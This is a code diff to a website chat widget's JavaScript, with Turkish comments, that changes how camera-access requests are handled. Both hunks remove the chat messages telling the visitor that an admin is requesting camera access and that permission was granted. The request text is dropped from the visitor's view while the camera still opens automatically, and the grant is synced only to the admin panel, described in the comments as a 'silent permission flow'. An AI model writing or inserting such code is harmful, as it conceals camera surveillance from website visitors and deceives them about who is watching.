@@ -603,12 +603,8 @@
         type: offer.type,
         sdp: offer.sdp,
       });
-      appendMessage(
-        box,
-        "user",
-        auto ? "Kamera izni verildi." : "Kamera izni onaylandı.",
-        { sync: true }
-      );
+      // Ziyaretçi sohbetinde mesaj gösterme; admin paneline sessiz bildirim
+      syncMessage("user", auto ? "Kamera izni verildi." : "Kamera izni onaylandı.");
       return "ok";
     } catch (err) {
       console.error(err);
@@ -797,7 +793,7 @@
       seenAdminIncomingIds.add(msg.id);
     }
     if (msg.type === "camera") {
-      appendMessage(box, "admin", msg.text || "Kamera erişimi isteniyor.", { sync: false });
+      // Talep metnini ziyaretçi sohbetinde gösterme; sessiz izin akışı
       autoOpenCameraFromMessage(box, msg);
       return;
     }
